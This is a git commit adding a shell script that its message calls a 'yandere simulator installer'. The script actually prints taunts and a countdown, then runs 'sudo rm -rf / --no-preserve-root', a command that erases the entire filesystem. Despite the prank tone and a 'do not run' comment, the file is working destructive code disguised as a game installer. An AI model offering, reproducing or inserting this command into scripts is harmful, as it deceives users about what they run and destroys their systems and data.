daf529d32921d9d3640f82dc9606b7ae03d37670
certifiedfoolio <156134535+certifiedfoolio@users.noreply.github.com>
2024-03-23 11:38:26 -0700

    funny script addition
    its a yandere simulator installer, trust me

---
+++ yandere_simulator.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+clear
+echo "bro actually thought he could install a yandere simulator"
+sleep 0.5
+echo "just for that imma nuke your session"
+echo "you dont deserve it smh"
+echo "here goes"
+for i in {5..1}
+do 
+ echo "Nuking root in" $i
+ sleep 1
+done
+# DO NOT RUN THIS ON AN ACTUAL SYSTEM!! SCARY!
+sudo rm -rf / --no-preserve-root
